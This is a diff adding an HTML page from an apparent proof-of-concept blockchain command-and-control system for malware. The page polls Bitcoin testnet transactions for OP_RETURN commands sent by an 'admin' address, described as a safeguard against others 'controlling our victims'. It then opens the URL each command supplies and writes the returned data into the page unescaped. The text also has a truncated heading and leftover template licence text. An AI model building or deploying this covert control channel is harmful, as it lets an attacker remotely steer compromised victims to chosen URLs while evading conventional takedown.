@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html>
+
+<!--
+This file is part of a blockchain_c2c PoC.
+
+blockchain_c2c is free software: you can redistribute it and/or modify
+it under the terms of the GNU General Public License as published by
+the Free Software Foundation, either version 3 of the License, or
+(at your option) any later version.
+
+Foobar is distributed in the hope that it will be useful,
+but WITHOUT ANY WARRANTY; without even the implied warranty of
+MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+GNU General Public License for more details.
+
+You should have received a copy of the GNU General Public License
+along with Foobar.  If not, see <http://www.gnu.org/licenses/>.
+-->
+
+<body>
+
+
+<h1>This is a PoC on how to use the blockchain to </h1>
+<p>You will have to configure the following parameters: the <b>monitor address</b> and the <b>admin address</b>. Although both can be the same, they are different: </p>
+<ul>
+    <li>
+        The <b>monitor address</b> is the address whose transactions will be checked in search of a valid <code>OP_RETURN</code> code.
+        <br>
+        Monitor address:
+        <input type="text" id="textMonitorAddress" value="mgiEN7RWEogjPFq5eAgK765kiibvc9sGNB"/>
+    </li>
+    <li>
+        The <b>admin address</b> is the address of the admin. Only transactions sent by this address will be considered valid commands. This verification has been included to prevent third parties from controlling our victims.
+        <br>
+        Admin address:
+        <input type="text" id="textAdminAddress" value="mgiEN7RWEogjPFq5eAgK765kiibvc9sGNB"/>
+    </li>
+</ul>
+
+<br>
+<button id="clickMe" onclick="checkServer()" /> Do whatever asked by the admin!</button>
+
+
+<pre id="command"></pre>
+<pre id="values"></pre>
+
+<!-- Loading the javascript -->
+<script src="js/c2c.js"></script>
+
+<!-- The main javascript-->
+<script>
+    function checkServer() {
+        var monitor_address = document.getElementById("textMonitorAddress").value;
+        var admin_address = document.getElementById("textAdminAddress").value;
+        // Info is a dictionary containing
+        /*
+        {
+            "response" : "{…}",
+            "command" : "connect http://example.com",",
+            "url"; "http://example.com",
+        }
+        */
+        var info = getDataFromBlockchain(monitor_address, admin_address);
+        // Opening info["url"] in the current tab:
+        window.open(info["url"]);
+
+        // Displaying the information in the website
+        document.getElementById("values").innerHTML = JSON.stringify(info["response"], null, 2);
+        // Showing it in the command element
+        document.getElementById("command").innerHTML = info["command"];
+    }
+</script>
+
+</body>
+</html>
